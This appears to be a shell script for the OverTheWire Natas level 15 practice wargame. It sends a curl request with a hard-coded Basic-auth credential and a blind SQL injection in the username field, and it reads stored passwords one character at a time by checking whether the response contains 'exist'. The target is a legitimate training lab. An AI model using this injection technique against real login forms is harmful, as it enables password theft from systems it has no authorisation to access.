curl 'http://natas15.natas.labs.overthewire.org/index.php' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://natas15.natas.labs.overthewire.org' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php' \
  -H 'Accept-Language: ru,en-US;q=0.9,en;q=0.8' \
  -H 'Cookie: __utma=176859643.880005724.1639593203.1639593203.1639593203.1; __utmz=176859643.1639593203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)' \
  --data 'username=" or (ascii(substr((select password from users limit '$(($1-1))',1) ,'$2',1))) > "'$3 \
  --compressed \
  --insecure \
  --silent | ggrep -o -P '.{0,2}exist' | xargs -I % echo % \| user: $1, letter: $2, needle: $3
